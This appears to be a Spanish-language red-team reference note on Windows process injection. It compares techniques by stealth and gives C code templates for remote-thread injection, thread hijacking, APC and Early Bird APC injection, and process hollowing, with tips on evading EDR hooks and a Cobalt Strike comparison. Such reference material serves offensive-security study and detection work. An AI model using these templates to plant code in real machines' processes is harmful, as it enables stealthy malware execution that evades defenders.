---
tags: [opsec, evasion, process-injection, shellcode]
status: done
platform: windows
---

# Process Injection

> Técnicas para inyectar y ejecutar código en el espacio de memoria de otro proceso.

---

## Comparativa de Técnicas

| Técnica | Sigilo | Complejidad | Requisitos |
|---------|--------|-------------|------------|
| Classic | ⚠️ Bajo | Baja | OpenProcess WRITE + CREATE_THREAD |
| Remote Thread | ⚠️ Bajo | Baja | OpenProcess + CreateRemoteThread |
| Thread Hijacking | 🟡 Medio | Media | Suspender hilo existente |
| APC Injection | 🟡 Medio | Media | Hilo en estado alertable |
| Early Bird APC | 🟢 Alto | Media-Alta | Crear proceso en SUSPENDED |
| Process Hollowing | 🟢 Alto | Alta | Crear proceso vacío + reemplazar |

---

## Classic Injection

```c
// 1. Abrir proceso destino
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

// 2. Reservar memoria RWX en destino
PVOID pRemote = VirtualAllocEx(hProc, NULL, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 3. Escribir shellcode
WriteProcessMemory(hProc, pRemote, payload, payloadSize, NULL);

// 4. Crear hilo en el proceso destino
HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
```

> ⚠️ CreateRemoteThread es una API muy monitorizada. Alta detección.

---

## Thread Hijacking

```c
// 1. Abrir proceso y obtener hilo
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);

// 2. Suspender el hilo legítimo
SuspendThread(hThread);

// 3. Obtener contexto del hilo (registros)
CONTEXT ctx = {};
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &ctx);

// 4. Allocar y escribir shellcode
PVOID pRemote = VirtualAllocEx(hProc, NULL, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, pRemote, payload, payloadSize, NULL);

// 5. Redirigir RIP al shellcode
ctx.Rip = (DWORD64)pRemote;
SetThreadContext(hThread, &ctx);

// 6. Reanudar — ahora ejecuta nuestro shellcode
ResumeThread(hThread);
```

---

## APC Injection

Las APC (Asynchronous Procedure Calls) son funciones que se ejecutan en el contexto de un hilo cuando está en estado "alertable" (WaitForSingleObjectEx, SleepEx, etc.).

```c
// 1. Abrir proceso
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

// 2. Allocar y escribir shellcode
PVOID pRemote = VirtualAllocEx(hProc, NULL, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, pRemote, payload, payloadSize, NULL);

// 3. Encolar APC en hilo del proceso destino
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
QueueUserAPC((PAPCFUNC)pRemote, hThread, 0);

// La APC se ejecuta cuando el hilo entre en estado alertable
```

---

## Early Bird APC

Variante más sigilosa: inyectar la APC **antes** de que el proceso destino comience a ejecutar su código legítimo.

```c
// 1. Crear proceso en estado suspendido
STARTUPINFO si = {};
PROCESS_INFORMATION pi = {};
CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
              CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Allocar y escribir shellcode en el nuevo proceso
PVOID pRemote = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, pRemote, payload, payloadSize, NULL);

// 3. Encolar APC en el hilo principal (que está suspendido)
QueueUserAPC((PAPCFUNC)pRemote, pi.hThread, 0);

// 4. Reanudar el hilo — lo primero que ejecuta es nuestro shellcode
ResumeThread(pi.hThread);
```

**Ventaja:** La APC se ejecuta durante la inicialización del proceso, antes de que cualquier EDR hook esté completamente establecido.

---

## Process Hollowing

Crear un proceso legítimo suspendido, vaciar su sección de código y reemplazarla con nuestro payload.

```c
// 1. Crear proceso legítimo suspendido
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);

// 2. Obtener dirección base del módulo en el proceso hijo
NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, ...);

// 3. Leer PEB para encontrar ImageBase
ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress + offset, &imageBase, ...);

// 4. Vaciar la sección
NtUnmapViewOfSection(pi.hProcess, imageBase);

// 5. Escribir nuestro payload en el espacio liberado
VirtualAllocEx(pi.hProcess, imageBase, payloadSize, ..., PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, imageBase, payload, payloadSize, NULL);

// 6. Actualizar EntryPoint en el contexto del hilo suspendido
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

---

## Fork & Run vs Inline (Cobalt Strike)

| | Fork & Run | Inline/BOF |
|-|-----------|------------|
| Proceso | Crea proceso hijo (spawnto) | Ejecuta en el beacon actual |
| Crash risk | Solo muere el hijo | Puede matar el beacon |
| Detección | Mayor (proceso hijo) | Menor |
| Uso típico | execute-assembly, mimikatz | BOFs, comandos nativos |

→ Ver [[08-infraestructura-c2/cobalt-strike/fork--and--run-vs-bof|Fork & Run vs BOF]]

